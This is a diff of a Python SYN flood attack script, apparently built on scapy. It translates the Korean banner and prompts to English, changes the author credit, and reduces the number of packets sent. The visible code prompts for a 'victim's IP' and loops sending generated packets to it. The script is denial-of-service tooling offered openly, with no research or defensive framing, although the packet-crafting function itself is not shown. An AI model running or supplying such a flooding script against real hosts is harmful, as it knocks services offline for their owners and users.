@@ -7,15 +7,15 @@ class VictimDevice:
         self.ip_addr = ip_addr
 
 def show_banner():
-    print("<< SYN FLOOD 공격")
-    print("[!] By 김가빈")
-    print("[!] Python: 김가빈")
+    print("<< SYN FLOOD Attack")
+    print("[!] By ta1e_")
+    print("[!] Python: ta1e_")
     print()
-    print("[*] 인터페이스: {}".format(conf.iface))
+    print("[*] Interface: {}".format(conf.iface))
 
 def get_victim_ip():
     while True:
-        victim_ip = input("[*] 피해자의 아이피를 써 넣으시오: ")
+        victim_ip = input("[*] Write down the victim's IP: ")
         if is_valid_ip(victim_ip):
             return VictimDevice(victim_ip)
         else:
@@ -42,7 +42,7 @@ def generate_packet(victim_ip):
 
 def run_attack(victim):
     try:
-        for x in range(0, 9999999):
+        for x in range(0, 99999):
             packet = generate_packet(victim)
             send(packet, verbose=0)
             print("Sent packet {}".format(x))
